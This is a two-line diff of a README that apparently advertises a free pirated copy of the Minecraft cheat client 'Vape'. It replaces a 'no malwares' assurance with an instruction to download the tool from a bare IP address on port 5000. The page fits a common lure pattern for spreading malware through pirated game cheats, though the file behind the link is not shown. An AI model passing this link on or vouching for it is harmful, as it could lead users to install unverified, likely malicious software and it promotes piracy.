@@ -1,2 +1,2 @@
-# Free-Vape-for-bjd-Minecraft-1.20.6-and-other-versions-
-It been made by zhouyi , It free , no malwares !!!
+You need to go to http://119.29.52.95:5000/ to download because I'm afraid of being "killed" by Vape's makers !!
+Thanks for downloading !!!
